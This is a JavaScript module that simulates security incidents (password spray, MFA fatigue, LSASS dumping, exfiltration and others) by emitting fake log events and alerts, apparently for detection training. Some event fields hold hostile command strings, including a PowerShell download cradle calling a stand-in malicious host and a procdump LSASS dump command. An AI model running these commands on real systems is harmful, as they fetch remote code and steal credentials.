// Attack Simulation Engine
// Generates realistic security events based on attack scenarios

import { v4 as uuidv4 } from './utils.js';

// Attack Scenarios with realistic event sequences
export const ATTACK_SCENARIOS = {
  passwordSpray: {
    id: 'password-spray',
    name: 'Password Spray Attack',
    description: 'Simulates an attacker attempting to compromise multiple accounts using common passwords',
    severity: 'High',
    tactics: ['Initial Access', 'Credential Access'],
    techniques: ['T1110.003'],
    duration: 30000, // 30 seconds
    icon: '🔑',
    phases: [
      { name: 'Reconnaissance', progress: 0, duration: 3000 },
      { name: 'Credential Testing', progress: 20, duration: 15000 },
      { name: 'Account Lockouts', progress: 60, duration: 5000 },
      { name: 'Detection', progress: 80, duration: 5000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  mfaFatigue: {
    id: 'mfa-fatigue',
    name: 'MFA Fatigue Attack',
    description: 'Simulates an attacker bombarding a user with MFA push notifications',
    severity: 'High',
    tactics: ['Credential Access'],
    techniques: ['T1621'],
    duration: 25000,
    icon: '📱',
    phases: [
      { name: 'Credential Obtained', progress: 0, duration: 2000 },
      { name: 'MFA Bombing Started', progress: 15, duration: 10000 },
      { name: 'User Fatigue', progress: 50, duration: 8000 },
      { name: 'Detection', progress: 85, duration: 3000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  impossibleTravel: {
    id: 'impossible-travel',
    name: 'Impossible Travel Detection',
    description: 'Simulates detecting logins from geographically impossible locations',
    severity: 'Medium',
    tactics: ['Initial Access'],
    techniques: ['T1078.004'],
    duration: 20000,
    icon: '✈️',
    phases: [
      { name: 'Login from New York', progress: 0, duration: 3000 },
      { name: 'Login from Tokyo (15 min later)', progress: 30, duration: 5000 },
      { name: 'Velocity Analysis', progress: 60, duration: 5000 },
      { name: 'Risk Calculation', progress: 80, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ]
  },
  servicePrincipalAbuse: {
    id: 'service-principal-abuse',
    name: 'Service Principal Abuse',
    description: 'Simulates malicious service principal creation and credential addition',
    severity: 'Critical',
    tactics: ['Persistence', 'Privilege Escalation'],
    techniques: ['T1136.003'],
    duration: 35000,
    icon: '🤖',
    phases: [
      { name: 'Initial Compromise', progress: 0, duration: 3000 },
      { name: 'App Registration Created', progress: 20, duration: 8000 },
      { name: 'Credentials Added', progress: 45, duration: 8000 },
      { name: 'Permissions Granted', progress: 70, duration: 8000 },
      { name: 'Detection', progress: 90, duration: 5000 },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ]
  },
  keyVaultExfil: {
    id: 'keyvault-exfil',
    name: 'Key Vault Secret Exfiltration',
    description: 'Simulates unauthorized access to Azure Key Vault secrets',
    severity: 'Critical',
    tactics: ['Credential Access', 'Collection'],
    techniques: ['T1552.004'],
    duration: 30000,
    icon: '🔐',
    phases: [
      { name: 'Access Token Obtained', progress: 0, duration: 4000 },
      { name: 'Key Vault Discovery', progress: 20, duration: 6000 },
      { name: 'Secret Enumeration', progress: 45, duration: 8000 },
      { name: 'Secrets Retrieved', progress: 70, duration: 6000 },
      { name: 'Anomaly Detected', progress: 90, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  lateralMovement: {
    id: 'lateral-movement',
    name: 'Lateral Movement via RDP',
    description: 'Simulates an attacker moving laterally through the network using RDP',
    severity: 'High',
    tactics: ['Lateral Movement'],
    techniques: ['T1021.001', 'T1021.002'],
    duration: 40000,
    icon: '🕸️',
    phases: [
      { name: 'Initial Foothold', progress: 0, duration: 4000 },
      { name: 'Credential Harvesting', progress: 15, duration: 8000 },
      { name: 'RDP to Workstation-01', progress: 35, duration: 8000 },
      { name: 'RDP to Server-DC01', progress: 55, duration: 8000 },
      { name: 'Domain Admin Access', progress: 75, duration: 6000 },
      { name: 'Detection', progress: 90, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  dataExfiltration: {
    id: 'data-exfil',
    name: 'Data Exfiltration',
    description: 'Simulates large data transfer to an unusual external destination',
    severity: 'Critical',
    tactics: ['Exfiltration'],
    techniques: ['T1041'],
    duration: 35000,
    icon: '📤',
    phases: [
      { name: 'Data Discovery', progress: 0, duration: 5000 },
      { name: 'Data Staging', progress: 20, duration: 8000 },
      { name: 'Compression & Encryption', progress: 40, duration: 6000 },
      { name: 'Transfer Initiated', progress: 55, duration: 8000 },
      { name: 'Volume Anomaly Detected', progress: 80, duration: 5000 },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ]
  },
  lsassDump: {
    id: 'lsass-dump',
    name: 'LSASS Credential Dumping',
    description: 'Simulates credential theft via LSASS memory access',
    severity: 'Critical',
    tactics: ['Credential Access'],
    techniques: ['T1003.001'],
    duration: 25000,
    icon: '💾',
    phases: [
      { name: 'Privilege Escalation', progress: 0, duration: 4000 },
      { name: 'Process Injection', progress: 20, duration: 5000 },
      { name: 'LSASS Access', progress: 45, duration: 6000 },
      { name: 'Memory Dump', progress: 70, duration: 5000 },
      { name: 'Detection', progress: 90, duration: 3000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  phishingCampaign: {
    id: 'phishing-campaign',
    name: 'Phishing Campaign',
    description: 'Simulates detection of a targeted phishing attack',
    severity: 'High',
    tactics: ['Initial Access'],
    techniques: ['T1566.001'],
    duration: 30000,
    icon: '🎣',
    phases: [
      { name: 'Email Received', progress: 0, duration: 3000 },
      { name: 'Attachment Analysis', progress: 15, duration: 6000 },
      { name: 'Sandbox Detonation', progress: 35, duration: 8000 },
      { name: 'Malware Identified', progress: 60, duration: 6000 },
      { name: 'Quarantine', progress: 80, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ]
  },
  emailForwarding: {
    id: 'email-forwarding',
    name: 'Suspicious Email Forwarding',
    description: 'Simulates detection of unauthorized inbox forwarding rules',
    severity: 'High',
    tactics: ['Collection'],
    techniques: ['T1114.003'],
    duration: 20000,
    icon: '📧',
    phases: [
      { name: 'Account Compromise', progress: 0, duration: 3000 },
      { name: 'Inbox Rule Created', progress: 25, duration: 5000 },
      { name: 'External Forward Detected', progress: 50, duration: 5000 },
      { name: 'Rule Analysis', progress: 75, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ]
  },
  encodedPowerShell: {
    id: 'encoded-powershell',
    name: 'Encoded PowerShell Execution',
    description: 'Simulates detection of obfuscated PowerShell commands',
    severity: 'High',
    tactics: ['Execution', 'Command and Control'],
    techniques: ['T1059.001', 'T1105'],
    duration: 25000,
    icon: '⚡',
    phases: [
      { name: 'Process Created', progress: 0, duration: 3000 },
      { name: 'Base64 Detected', progress: 20, duration: 5000 },
      { name: 'Command Decoded', progress: 45, duration: 6000 },
      { name: 'Download Cradle Found', progress: 70, duration: 5000 },
      { name: 'Detection', progress: 90, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
  privilegeEscalation: {
    id: 'privilege-escalation',
    name: 'Privileged Role Assignment',
    description: 'Simulates unauthorized assignment to Global Administrator role',
    severity: 'Critical',
    tactics: ['Persistence', 'Privilege Escalation'],
    techniques: ['T1098.003'],
    duration: 25000,
    icon: '👑',
    phases: [
      { name: 'Compromised Admin', progress: 0, duration: 3000 },
      { name: 'Role Assignment Request', progress: 20, duration: 5000 },
      { name: 'Global Admin Added', progress: 45, duration: 6000 },
      { name: 'Audit Log Captured', progress: 70, duration: 5000 },
      { name: 'Detection', progress: 90, duration: 4000 },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ]
  },
};

// Sample entities for generating realistic events
const SAMPLE_USERS = [
  'alice@contoso.com', 'bob@contoso.com', 'carol@contoso.com', 
  'david@contoso.com', 'erin@contoso.com', 'frank@contoso.com',
  'grace@contoso.com', 'henry@contoso.com', 'iris@contoso.com',
  'admin@contoso.com', 'secops@contoso.com', 'helpdesk@contoso.com'
];

const SAMPLE_IPS = [
  '203.0.113.10', '198.51.100.23', '192.0.2.44', '45.155.205.233',
  '185.220.101.1', '89.248.165.52', '141.98.10.121', '103.75.201.4',
  '10.0.0.15', '10.0.1.25', '10.0.2.50', '192.168.1.100'
];

const SAMPLE_DEVICES = [
  'WORKSTATION-01', 'WORKSTATION-02', 'LAPTOP-SALES-01', 'LAPTOP-DEV-03',
  'SERVER-DC01', 'SERVER-SQL01', 'SERVER-WEB01', 'SERVER-FILE01'
];

const SAMPLE_APPS = [
  'Office 365', 'Azure Portal', 'Microsoft Teams', 'SharePoint Online',
  'Power BI', 'Dynamics 365', 'Azure DevOps', 'Microsoft Graph'
];

const SAMPLE_LOCATIONS = [
  { city: 'New York', country: 'US', lat: 40.7128, lng: -74.0060 },
  { city: 'London', country: 'GB', lat: 51.5074, lng: -0.1278 },
  { city: 'Tokyo', country: 'JP', lat: 35.6762, lng: 139.6503 },
  { city: 'Sydney', country: 'AU', lat: -33.8688, lng: 151.2093 },
  { city: 'Berlin', country: 'DE', lat: 52.5200, lng: 13.4050 },
  { city: 'Moscow', country: 'RU', lat: 55.7558, lng: 37.6173 },
  { city: 'Beijing', country: 'CN', lat: 39.9042, lng: 116.4074 },
  { city: 'São Paulo', country: 'BR', lat: -23.5505, lng: -46.6333 },
];

// Random selection helpers
const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

// Event generators for each attack type
const eventGenerators = {
  'password-spray': (phase, progress) => {
    const events = [];
    const attackerIP = '45.155.205.233';
    
    if (phase.name === 'Credential Testing') {
      for (let i = 0; i < randomInt(3, 6); i++) {
        events.push({
          id: uuidv4(),
          timestamp: new Date().toISOString(),
          type: 'SigninLogs',
          severity: 'Medium',
          title: 'Failed sign-in attempt',
          description: `Failed authentication for ${randomItem(SAMPLE_USERS)}`,
          entities: {
            user: randomItem(SAMPLE_USERS),
            ip: attackerIP,
            app: 'Office 365',
            resultCode: '50126',
            resultDescription: 'Invalid username or password'
          },
          rawLog: `SigninLogs | ResultType: 50126 | IPAddress: ${attackerIP}`,
          mitre: ['T1110.003']
        });
      }
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'Password Spray Attack Detected',
        description: `Multiple failed authentications from ${attackerIP} across ${randomInt(8, 15)} accounts`,
        entities: {
          ip: attackerIP,
          affectedAccounts: randomInt(8, 15),
          failedAttempts: randomInt(50, 100)
        },
        mitre: ['T1110.003']
      });
    }
    return events;
  },

  'mfa-fatigue': (phase, progress) => {
    const events = [];
    const targetUser = 'erin@contoso.com';
    const attackerIP = '185.220.101.1';
    
    if (phase.name === 'MFA Bombing Started') {
      for (let i = 0; i < randomInt(3, 5); i++) {
        events.push({
          id: uuidv4(),
          timestamp: new Date().toISOString(),
          type: 'SigninLogs',
          severity: 'Medium',
          title: 'MFA challenge denied',
          description: `User ${targetUser} denied MFA prompt`,
          entities: {
            user: targetUser,
            ip: attackerIP,
            mfaResult: 'denied',
            authMethod: 'Microsoft Authenticator'
          },
          mitre: ['T1621']
        });
      }
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'MFA Fatigue Attack Detected',
        description: `${randomInt(8, 15)} MFA denials for ${targetUser} in 10 minutes`,
        entities: {
          user: targetUser,
          ip: attackerIP,
          mfaDenials: randomInt(8, 15)
        },
        mitre: ['T1621']
      });
    }
    return events;
  },

  'impossible-travel': (phase, progress) => {
    const events = [];
    const targetUser = 'dana@contoso.com';
    
    if (phase.name === 'Login from New York') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'SigninLogs',
        severity: 'Low',
        title: 'Successful sign-in',
        description: `${targetUser} signed in from New York, US`,
        entities: {
          user: targetUser,
          ip: '198.51.100.23',
          location: { city: 'New York', country: 'US' },
          app: 'Office 365'
        },
        mitre: ['T1078.004']
      });
    } else if (phase.name === 'Login from Tokyo (15 min later)') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'SigninLogs',
        severity: 'Medium',
        title: 'Suspicious sign-in',
        description: `${targetUser} signed in from Tokyo, JP (impossible travel)`,
        entities: {
          user: targetUser,
          ip: '103.75.201.4',
          location: { city: 'Tokyo', country: 'JP' },
          app: 'Office 365',
          riskLevel: 'high'
        },
        mitre: ['T1078.004']
      });
    } else if (phase.name === 'Alert Generated') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Medium',
        title: 'Impossible Travel Detected',
        description: `${targetUser} logged in from 2 locations 10,800 km apart in 15 minutes`,
        entities: {
          user: targetUser,
          locations: ['New York, US', 'Tokyo, JP'],
          distance: '10,800 km',
          timespan: '15 minutes',
          calculatedSpeed: '43,200 km/h'
        },
        mitre: ['T1078.004']
      });
    }
    return events;
  },

  'service-principal-abuse': (phase, progress) => {
    const events = [];
    const attacker = 'compromised-admin@contoso.com';
    const spName = 'Malicious-App-' + randomInt(1000, 9999);
    
    if (phase.name === 'App Registration Created') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'AuditLogs',
        severity: 'Medium',
        title: 'Service principal created',
        description: `New service principal "${spName}" created by ${attacker}`,
        entities: {
          actor: attacker,
          servicePrincipal: spName,
          operation: 'Add service principal'
        },
        mitre: ['T1136.003']
      });
    } else if (phase.name === 'Credentials Added') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'AuditLogs',
        severity: 'High',
        title: 'Credentials added to service principal',
        description: `Password credential added to "${spName}"`,
        entities: {
          actor: attacker,
          servicePrincipal: spName,
          operation: 'Add service principal credentials'
        },
        mitre: ['T1136.003']
      });
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Critical',
        title: 'Service Principal Abuse Detected',
        description: `Suspicious service principal creation and credential addition within 15 minutes`,
        entities: {
          actor: attacker,
          servicePrincipal: spName,
          correlationWindow: '15 minutes'
        },
        mitre: ['T1136.003']
      });
    }
    return events;
  },

  'keyvault-exfil': (phase, progress) => {
    const events = [];
    const attacker = 'malicious-sp@contoso.com';
    const keyVault = 'prod-secrets-kv';
    
    if (phase.name === 'Secret Enumeration') {
      for (let i = 0; i < randomInt(5, 10); i++) {
        events.push({
          id: uuidv4(),
          timestamp: new Date().toISOString(),
          type: 'AzureDiagnostics',
          severity: 'Medium',
          title: 'Key Vault secret access',
          description: `Secret retrieved from ${keyVault}`,
          entities: {
            identity: attacker,
            keyVault: keyVault,
            operation: 'SecretGet',
            secretName: `secret-${randomInt(1, 20)}`
          },
          mitre: ['T1552.004']
        });
      }
    } else if (phase.name === 'Anomaly Detected') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Critical',
        title: 'Key Vault Secret Access Anomaly',
        description: `Unusual volume of secret retrievals from ${keyVault}`,
        entities: {
          identity: attacker,
          keyVault: keyVault,
          secretsAccessed: randomInt(15, 30),
          newIPAccess: true
        },
        mitre: ['T1552.004']
      });
    }
    return events;
  },

  'lateral-movement': (phase, progress) => {
    const events = [];
    const attacker = 'compromised-user';
    
    if (phase.name.includes('RDP to')) {
      const target = phase.name.includes('Workstation') ? 'WORKSTATION-01' : 'SERVER-DC01';
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'SecurityEvent',
        severity: 'Medium',
        title: 'RDP session established',
        description: `New RDP session to ${target}`,
        entities: {
          source: '10.0.0.15',
          destination: target,
          logonType: 10,
          user: attacker
        },
        mitre: ['T1021.001']
      });
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'Unusual Lateral Movement Detected',
        description: 'New RDP sessions to previously unaccessed hosts',
        entities: {
          user: attacker,
          hostsAccessed: ['WORKSTATION-01', 'SERVER-DC01'],
          sessionCount: 4
        },
        mitre: ['T1021.001', 'T1021.002']
      });
    }
    return events;
  },

  'data-exfil': (phase, progress) => {
    const events = [];
    
    if (phase.name === 'Transfer Initiated') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'CommonSecurityLog',
        severity: 'High',
        title: 'Large outbound data transfer',
        description: 'Unusual data volume to external IP',
        entities: {
          sourceIP: '10.0.1.25',
          destinationIP: '45.155.205.233',
          bytesOut: randomInt(50000000, 200000000),
          protocol: 'HTTPS'
        },
        mitre: ['T1041']
      });
    } else if (phase.name === 'Volume Anomaly Detected') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Critical',
        title: 'Data Exfiltration Detected',
        description: 'Large data transfer to rare external destination',
        entities: {
          sourceIP: '10.0.1.25',
          destinationIP: '45.155.205.233',
          totalBytes: '175 MB',
          destinationCountry: 'RU',
          baselineDeviation: '450%'
        },
        mitre: ['T1041']
      });
    }
    return events;
  },

  'lsass-dump': (phase, progress) => {
    const events = [];
    const device = 'WORKSTATION-01';
    
    if (phase.name === 'LSASS Access') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'DeviceProcessEvents',
        severity: 'High',
        title: 'Suspicious process accessing LSASS',
        description: 'procdump.exe accessing lsass.exe memory',
        entities: {
          device: device,
          process: 'procdump.exe',
          targetProcess: 'lsass.exe',
          commandLine: 'procdump.exe -ma lsass.exe lsass.dmp',
          user: 'NT AUTHORITY\\SYSTEM'
        },
        mitre: ['T1003.001']
      });
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Critical',
        title: 'Credential Dumping Detected',
        description: 'LSASS memory access by suspicious process',
        entities: {
          device: device,
          technique: 'LSASS Memory Dump',
          tool: 'procdump.exe',
          recommendation: 'Isolate host and rotate credentials'
        },
        mitre: ['T1003.001']
      });
    }
    return events;
  },

  'phishing-campaign': (phase, progress) => {
    const events = [];
    
    if (phase.name === 'Email Received') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'EmailEvents',
        severity: 'Medium',
        title: 'Suspicious email received',
        description: 'Inbound email with suspicious attachment',
        entities: {
          sender: 'security-alert@microsoft-verify.com',
          recipient: randomItem(SAMPLE_USERS),
          subject: 'Urgent: Verify your account',
          attachmentName: 'Invoice_Dec2024.xlsm'
        },
        mitre: ['T1566.001']
      });
    } else if (phase.name === 'Malware Identified') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'Phishing Attack Detected',
        description: 'Malicious macro document blocked',
        entities: {
          sender: 'security-alert@microsoft-verify.com',
          malwareFamily: 'Emotet',
          attachmentHash: 'a1b2c3d4e5f6...',
          recipientsAffected: randomInt(5, 20)
        },
        mitre: ['T1566.001']
      });
    }
    return events;
  },

  'email-forwarding': (phase, progress) => {
    const events = [];
    const user = 'bob@contoso.com';
    
    if (phase.name === 'Inbox Rule Created') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'OfficeActivity',
        severity: 'Medium',
        title: 'New inbox rule created',
        description: 'Forward rule to external address',
        entities: {
          user: user,
          operation: 'New-InboxRule',
          forwardTo: 'exfil@malicious-domain.com',
          clientIP: '45.155.205.233'
        },
        mitre: ['T1114.003']
      });
    } else if (phase.name === 'Rule Analysis') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'Suspicious Email Forwarding Detected',
        description: 'Inbox rule forwarding to unknown external domain',
        entities: {
          user: user,
          externalDomain: 'malicious-domain.com',
          clientIP: '45.155.205.233',
          recommendation: 'Remove rule and reset credentials'
        },
        mitre: ['T1114.003']
      });
    }
    return events;
  },

  'encoded-powershell': (phase, progress) => {
    const events = [];
    const device = 'LAPTOP-DEV-03';
    
    if (phase.name === 'Base64 Detected') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'DeviceProcessEvents',
        severity: 'High',
        title: 'Encoded PowerShell execution',
        description: 'PowerShell with -EncodedCommand parameter',
        entities: {
          device: device,
          process: 'powershell.exe',
          commandLine: 'powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoA...',
          parentProcess: 'cmd.exe'
        },
        mitre: ['T1059.001']
      });
    } else if (phase.name === 'Download Cradle Found') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'High',
        title: 'Suspicious PowerShell Detected',
        description: 'Encoded command with download cradle pattern',
        entities: {
          device: device,
          decodedCommand: 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload.ps1")',
          c2Domain: 'malicious.com',
          recommendation: 'Isolate host and investigate'
        },
        mitre: ['T1059.001', 'T1105']
      });
    }
    return events;
  },

  'privilege-escalation': (phase, progress) => {
    const events = [];
    const attacker = 'compromised-admin@contoso.com';
    const target = 'attacker-account@contoso.com';
    
    if (phase.name === 'Global Admin Added') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'AuditLogs',
        severity: 'Critical',
        title: 'Privileged role assignment',
        description: 'User added to Global Administrator role',
        entities: {
          initiator: attacker,
          targetUser: target,
          role: 'Global Administrator',
          operation: 'Add member to role'
        },
        mitre: ['T1098.003']
      });
    } else if (phase.name === 'Detection') {
      events.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        type: 'Alert',
        severity: 'Critical',
        title: 'Privileged Role Assignment Detected',
        description: 'Unexpected Global Administrator role assignment',
        entities: {
          initiator: attacker,
          targetUser: target,
          role: 'Global Administrator',
          recommendation: 'Review and revoke if unauthorized'
        },
        mitre: ['T1098.003']
      });
    }
    return events;
  },
};

class AttackSimulator {
  constructor() {
    this.activeSimulation = null;
    this.eventCallbacks = [];
    this.progressCallbacks = [];
    this.phaseCallbacks = [];
  }

  onEvent(callback) {
    this.eventCallbacks.push(callback);
    return () => {
      this.eventCallbacks = this.eventCallbacks.filter(cb => cb !== callback);
    };
  }

  onProgress(callback) {
    this.progressCallbacks.push(callback);
    return () => {
      this.progressCallbacks = this.progressCallbacks.filter(cb => cb !== callback);
    };
  }

  onPhase(callback) {
    this.phaseCallbacks.push(callback);
    return () => {
      this.phaseCallbacks = this.phaseCallbacks.filter(cb => cb !== callback);
    };
  }

  emitEvent(event) {
    this.eventCallbacks.forEach(cb => cb(event));
  }

  emitProgress(progress) {
    this.progressCallbacks.forEach(cb => cb(progress));
  }

  emitPhase(phase) {
    this.phaseCallbacks.forEach(cb => cb(phase));
  }

  getScenarios() {
    return Object.values(ATTACK_SCENARIOS);
  }

  getScenario(id) {
    return ATTACK_SCENARIOS[id] || Object.values(ATTACK_SCENARIOS).find(s => s.id === id);
  }

  async startSimulation(scenarioId) {
    const scenario = this.getScenario(scenarioId);
    if (!scenario) {
      throw new Error(`Unknown scenario: ${scenarioId}`);
    }

    if (this.activeSimulation) {
      this.stopSimulation();
    }

    this.activeSimulation = {
      scenario,
      startTime: Date.now(),
      phaseIndex: 0,
      cancelled: false
    };

    // Run through phases
    for (const phase of scenario.phases) {
      if (this.activeSimulation.cancelled) break;

      this.emitPhase(phase);
      this.emitProgress(phase.progress);

      // Generate events for this phase
      const generator = eventGenerators[scenario.id];
      if (generator) {
        const events = generator(phase, phase.progress);
        for (const event of events) {
          if (this.activeSimulation.cancelled) break;
          this.emitEvent(event);
          await this.sleep(randomInt(200, 800));
        }
      }

      await this.sleep(phase.duration);
    }

    this.emitProgress(100);
    
    // Generate final incident
    const incident = {
      id: uuidv4(),
      title: scenario.name,
      description: scenario.description,
      severity: scenario.severity,
      status: 'New',
      createdAt: new Date().toISOString(),
      tactics: scenario.tactics,
      techniques: scenario.techniques,
      events: [],
      entities: {}
    };

    this.emitEvent({
      id: uuidv4(),
      timestamp: new Date().toISOString(),
      type: 'Incident',
      severity: scenario.severity,
      title: `Incident Created: ${scenario.name}`,
      description: scenario.description,
      incident
    });

    this.activeSimulation = null;
    return incident;
  }

  stopSimulation() {
    if (this.activeSimulation) {
      this.activeSimulation.cancelled = true;
      this.activeSimulation = null;
    }
  }

  isRunning() {
    return this.activeSimulation !== null;
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Generate random background events
  generateRandomEvent() {
    const eventTypes = [
      {
        type: 'SigninLogs',
        title: 'Successful sign-in',
        severity: 'Low',
        generator: () => ({
          user: randomItem(SAMPLE_USERS),
          ip: randomItem(SAMPLE_IPS),
          app: randomItem(SAMPLE_APPS),
          location: randomItem(SAMPLE_LOCATIONS)
        })
      },
      {
        type: 'AuditLogs',
        title: 'Configuration change',
        severity: 'Low',
        generator: () => ({
          actor: randomItem(SAMPLE_USERS),
          operation: randomItem(['Update user', 'Reset password', 'Update policy']),
          target: randomItem(SAMPLE_USERS)
        })
      },
      {
        type: 'SecurityEvent',
        title: 'Process created',
        severity: 'Low',
        generator: () => ({
          device: randomItem(SAMPLE_DEVICES),
          process: randomItem(['explorer.exe', 'chrome.exe', 'outlook.exe', 'teams.exe']),
          user: randomItem(SAMPLE_USERS).split('@')[0]
        })
      },
      {
        type: 'CommonSecurityLog',
        title: 'Network connection',
        severity: 'Low',
        generator: () => ({
          sourceIP: randomItem(SAMPLE_IPS),
          destinationIP: randomItem(SAMPLE_IPS),
          port: randomItem([80, 443, 22, 3389]),
          action: 'Allow'
        })
      }
    ];

    const eventType = randomItem(eventTypes);
    return {
      id: uuidv4(),
      timestamp: new Date().toISOString(),
      type: eventType.type,
      severity: eventType.severity,
      title: eventType.title,
      entities: eventType.generator()
    };
  }
}

export const attackSimulator = new AttackSimulator();
export default attackSimulator;
